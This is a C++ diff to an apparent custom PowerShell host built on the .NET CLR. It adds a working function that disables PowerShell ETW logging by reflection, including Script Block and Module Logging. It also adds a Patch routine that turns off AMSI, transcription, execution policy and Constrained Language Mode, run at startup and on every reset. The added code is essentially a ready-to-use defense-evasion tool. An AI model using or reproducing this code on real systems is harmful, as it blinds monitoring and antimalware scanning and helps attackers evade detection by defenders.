@@ -1,12 +1,14 @@
 #include "clr.h"
 #include "common.h"
+#include "patch.h"
+#include <iostream>
+#include <string>
+#include <propvarutil.h>
+
 
 #ifdef _WINDLL
 
 #else
-#include <iostream>
-#include <string>
-#include <propvarutil.h>
 
 // Helper functions
 BOOL System_Object_GetType(CLR& clr, VARIANT vtObject, VARIANT* pvtType) {
@@ -608,6 +610,96 @@ exit:
     return bResult;
 }
 
+//
+// The following function retrieves an instance of the PSEtwLogProvider class, gets
+// the value of its 'etwProvider' member, which is an EventProvider object, and sets
+// the 'm_enabled' attribute of this latter object to 0, thus effectively disabling
+// all PowerShell event logs in the current process. This includes Script Block
+// Logging and Module Logging.
+// 
+// Credit:
+//   - https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32
+//
+BOOL DisablePowerShellEtwProvider(CLR& clr)
+{
+    BOOL bResult = FALSE;
+    HRESULT hr;
+    VARIANT vtEmpty = { 0 };
+    VARIANT vtPsEtwLogProviderInstance = { 0 };
+    VARIANT vtZero = { 0 };
+    _Type* pPsEtwLogProviderType = NULL;
+    _Type* pEventProviderType = NULL;
+    _FieldInfo* pEnabledInfo = NULL;
+    _Assembly* pAsm = NULL;
+    _Assembly* pAsmCore = NULL;
+
+    if (!clr.LoadAssembly(L"System.Management.Automation", &pAsm)) {
+        goto exit;
+    }
+
+    if (!clr.LoadAssembly(L"System.Core", &pAsmCore)) {
+        goto exit;
+    }
+
+    if (!clr.GetType(pAsm, L"System.Management.Automation.Tracing.PSEtwLogProvider", &pPsEtwLogProviderType))
+        goto exit;
+
+    if (!clr.GetFieldValue(pPsEtwLogProviderType, BindingFlags(BindingFlags_NonPublic | BindingFlags_Static), vtEmpty, L"etwProvider", &vtPsEtwLogProviderInstance))
+        goto exit;
+
+    if (!clr.GetType(pAsmCore, L"System.Diagnostics.Eventing.EventProvider", &pEventProviderType))
+        goto exit;
+
+    if (!clr.GetField(pEventProviderType, BindingFlags(BindingFlags_NonPublic | BindingFlags_Instance), L"m_enabled", &pEnabledInfo))
+        goto exit;
+
+    InitVariantFromInt32(0, &vtZero);
+
+    hr = pEnabledInfo->SetValue_2(vtPsEtwLogProviderInstance, vtZero);
+    if (FAILED(hr)) {
+        goto exit;
+    }
+
+    bResult = TRUE;
+
+exit:
+    if (pEnabledInfo) pEnabledInfo->Release();
+    if (pEventProviderType) pEventProviderType->Release();
+    if (pPsEtwLogProviderType) pPsEtwLogProviderType->Release();
+    if (pAsm) pAsm->Release();
+    if (pAsmCore) pAsmCore->Release();
+
+    VariantClear(&vtPsEtwLogProviderInstance);
+
+    return bResult;
+}
+
+void Patch(CLR& clr) {
+    if (!PatchAmsiOpenSession()) {
+        PRINT_ERROR("Failed to disable AMSI (1).\n");
+    }
+
+    if (!PatchAmsiScanBuffer()) {
+        PRINT_ERROR("Failed to disable AMSI (2).\n");
+    }
+
+    if (!DisablePowerShellEtwProvider(clr)) {
+        PRINT_ERROR("Failed to disable ETW Provider.\n");
+    }
+
+    if (!PatchTranscriptionOptionFlushContentToDisk(clr)) {
+        PRINT_ERROR("Failed to disable Transcription.\n");
+    }
+
+    if (!PatchAuthorizationManagerShouldRunInternal(clr)) {
+        PRINT_ERROR("Failed to disable Execution Policy enforcement.\n");
+    }
+
+    if (!PatchSystemPolicyGetSystemLockdownPolicy(clr)) {
+        PRINT_ERROR("Failed to disable Constrained Mode Language.\n");
+    }
+}
+
 int main() {
     int nRet = 0;
     CLR clr;
@@ -672,6 +764,7 @@ int main() {
     SafeArrayDestroy(pEmptyArgs);
     pEmptyArgs = NULL;
 
+    Patch(clr);
     wprintf(L"[+] PowerShell ready (type 'exit' to quit)\n\n");
 
     while (true) {
@@ -729,6 +822,8 @@ int main() {
                 wprintf(L"[!] Failed to recreate PowerShell instance\n");
                 goto cleanup;
             }
+
+            Patch(clr);
             SafeArrayDestroy(pResetArgs);
         }
 
